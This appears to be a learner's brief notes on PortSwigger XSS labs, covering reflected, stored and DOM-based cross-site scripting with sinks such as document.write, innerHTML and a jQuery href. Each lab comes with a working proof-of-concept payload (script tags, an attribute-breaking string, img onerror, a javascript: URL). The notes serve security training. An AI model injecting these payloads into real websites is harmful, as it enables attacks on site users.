# Cross-Site Scripting - PortSwigger Notes

#### 1. Reflected XSS into HTML context with no encoding:

```
<script>alert('hello')</script>
```

can be only exploited by social engineering.

eg: in search bar.

#### 2. Stored XSS into HTML context with no encoding.

```javascript
<script>alert('hello')</script>
```

eg: in a blog.

##### 3.  DOM XSS in `document.write` sink using source `location.search`

<img src="/resources/images/tracker.gif?searchTerms=hello"

we need to close the img tag and add the payload,

```
hello"><script>alert(1)</script>
```

#### 4. DOM XSS in `innerHTML` sink using source

As innerHTML does not execute script tag, we should provide img tag.

```
<img src=x onerror=alert(1)>
```

#### 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

The input value is taken and inserted into an <href> tag and then the <href> inserted to <a> tag. We need inject payload in the url,

```
javascript:alert(1);
```


